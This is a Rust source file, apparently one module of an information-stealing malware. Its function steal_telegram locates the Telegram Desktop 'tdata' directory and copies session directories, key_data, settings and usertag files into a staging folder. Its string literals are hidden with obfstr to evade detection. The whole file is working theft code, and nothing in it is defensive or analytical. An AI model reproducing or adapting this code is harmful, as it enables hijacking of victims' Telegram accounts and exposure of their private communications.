use walkdir::*;

pub fn steal_telegram(path_in: String) -> Option<String>{

    let app_data = std::env::var("APPDATA").ok()?;

    if std::path::Path::new(&format!("{}\\{}", app_data, obfstr::obfstr!("Telegram Desktop\\tdata"))).exists() {
      let _ =  std::fs::create_dir(format!("{path_in}\\{}", obfstr::obfstr!("telegram\\")));

        

        for entry in WalkDir::new(std::path::Path::new(&format!("{}\\{}", app_data, obfstr::obfstr!("Telegram Desktop\\tdata\\")))).max_depth(3).into_iter().filter_map(|f| f.ok()) {

            if entry.file_name().to_str().unwrap().len() != 16 {
                continue;
            }else {
               let _ = crate::misc::copy_directory(entry.path(), format!("{path_in}\\{}\\{}", obfstr::obfstr!("telegram\\tdata"), entry.file_name().to_str().unwrap()));
            }

                       
        }
        for entry in WalkDir::new(std::path::Path::new(&format!("{}\\{}", app_data, obfstr::obfstr!("Telegram Desktop")))).max_depth(3).into_iter().filter_map(|f| f.ok()) {
            let buffer: Vec<u8> = match &entry.metadata() {
                Ok(metadata) => Vec::with_capacity(metadata.len() as usize),
                Err(_) => Vec::new(),
            };
            if buffer.capacity() >= 6291456  {
                continue;
            }   

            drop(buffer);

            if entry.file_name().to_str().unwrap().ends_with("s") && entry.file_name().to_str().unwrap().len() == 17 {
                let _ = std::fs::copy(entry.path(), format!("{path_in}\\{}\\{}", obfstr::obfstr!("telegram"), entry.file_name().to_str().unwrap()));
            }

            if entry.file_name().to_str().unwrap().starts_with(obfstr::obfstr!("usertag")) || entry.file_name().to_str().unwrap().starts_with(obfstr::obfstr!("settings")) || entry.file_name().to_str().unwrap().starts_with(obfstr::obfstr!("key_data")) {
                let _ = std::fs::copy(entry.path(), format!("{path_in}\\{}\\{}", obfstr::obfstr!("telegram"), entry.file_name().to_str().unwrap()));
            }

            unsafe {
                crate::OTHERS += 1;
            }

        }

    }
    return Some(String::new());

}


